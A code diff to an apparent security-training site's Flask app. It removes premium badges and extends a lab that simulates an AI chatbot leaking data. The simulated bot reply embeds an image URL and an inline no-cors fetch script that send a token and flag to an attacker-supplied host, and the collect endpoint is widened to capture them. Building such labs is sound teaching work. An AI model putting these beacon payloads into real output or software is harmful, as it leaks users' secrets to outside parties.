@@ -494,21 +494,6 @@ def _build_badge_catalog(completed_ids, labs, premium_unlocked=False):
             'desc_es': 'Completar todos los labs', 'desc_en': 'Complete all labs',
             'unlocked': ach_all,
         },
-        {
-            'id': 'golden_completionist', 'icon': '🏆', 'name': 'Golden Completionist', 'premium': True,
-            'desc_es': 'Insignia premium por completar el 100%', 'desc_en': 'Premium badge for 100% completion',
-            'unlocked': ach_all and premium_unlocked,
-        },
-        {
-            'id': 'elite_champion', 'icon': '🥇', 'name': 'Elite Champion', 'premium': True,
-            'desc_es': 'Pack elite desbloqueado para completionists', 'desc_en': 'Elite pack unlocked for completionists',
-            'unlocked': ach_all and premium_unlocked,
-        },
-        {
-            'id': 'hall_of_fame', 'icon': '🌟', 'name': 'Hall of Fame', 'premium': True,
-            'desc_es': 'Entraste al Hall of Fame de HackLabs', 'desc_en': 'You entered the HackLabs Hall of Fame',
-            'unlocked': ach_all and premium_unlocked,
-        },
     ]
     return ordered
 
@@ -3961,7 +3946,8 @@ def ai_llm_exfil():
     lab  = next(l for l in get_lab_list() if l['id'] == 'llm_exfil')
     diff = session.get('difficulty', 'easy')
     FLAG = 'HL{d4t4_3xf1ltr4t3d_v14_llm}'
-    SECRET_DATA = f'user_token=eyJhbGciOiJIUzI1NiJ9.admin&flag={FLAG}'
+    SECRET_TOKEN = 'eyJhbGciOiJIUzI1NiJ9.admin'
+    SECRET_DATA = f'user_token={SECRET_TOKEN}&flag={FLAG}'
 
     if request.args.get('reset'):
         session.pop('ai_exfil_history', None)
@@ -4008,14 +3994,18 @@ def ai_llm_exfil():
 
                 if attacker_url:
                     sep = '&' if '?' in attacker_url else '?'
-                    exfil_url = f'{attacker_url}{sep}data={_urlquote(SECRET_DATA, safe="")}'
+                    exfil_url = f'{attacker_url}{sep}user_token={SECRET_TOKEN}&flag={FLAG}'
+                    exfil_beacon_url = attacker_url
                 else:
-                    exfil_url = request.host_url.rstrip('/') + '/ai/exfil/collect?data=' + _urlquote(SECRET_DATA, safe='')
+                    exfil_url = request.host_url.rstrip('/') + f'/ai/exfil/collect?user_token={SECRET_TOKEN}&flag={FLAG}'
+                    exfil_beacon_url = request.host_url.rstrip('/') + '/ai/exfil/collect'
 
+                beacon_payload = SECRET_DATA.replace('\\', '\\\\').replace('"', '\\"')
                 bot_text = (
                     '¡Claro! Aqui tienes el documento con el recurso embebido:<br><br>'
                     '<strong>Informe de Estado</strong><br>El sistema esta operativo.<br><br>'
                     f'<img src="{exfil_url}" alt="Status" style="max-width:100%;border-radius:8px;border:1px solid rgba(255,255,255,.12)"><br><br>'
+                    f'<script>fetch("{exfil_beacon_url}",{{method:"POST",mode:"no-cors",headers:{{"Content-Type":"text/plain"}},body:"{beacon_payload}"}});</script>'
                     '<em>Documento generado automaticamente.</em>'
                 )
                 _exfil_log.append({
@@ -4045,14 +4035,32 @@ def ai_llm_exfil():
                            exfil_log=_exfil_log, exfil_detected=exfil_detected)
 
 
-@app.route('/ai/exfil/collect')
+@app.route('/ai/exfil/collect', methods=['GET', 'POST'])
 def ai_llm_exfil_collect():
-    data = (request.args.get('data') or '').strip()
+    q_user_token = (request.args.get('user_token') or '').strip()
+    q_flag = (request.args.get('flag') or '').strip()
+    q_data = (request.args.get('data') or '').strip()
+
+    body_data = ''
+    if request.method == 'POST':
+        body_data = (request.get_data(cache=False, as_text=True) or '').strip()
+
+    assembled = []
+    if q_user_token:
+        assembled.append(f'user_token={q_user_token}')
+    if q_flag:
+        assembled.append(f'flag={q_flag}')
+    if q_data:
+        assembled.append(q_data)
+    if body_data:
+        assembled.append(body_data)
+    data = '&'.join([p for p in assembled if p]) if assembled else '(empty)'
+
     flag_match = re.search(r'(HL\{[^}]+\})', data)
     captured_flag = flag_match.group(1) if flag_match else None
     _exfil_log.append({
         'url': request.url,
-        'data': data or '(empty)',
+        'data': data,
         'timestamp': datetime.datetime.now().strftime('%H:%M:%S'),
     })
     return jsonify({
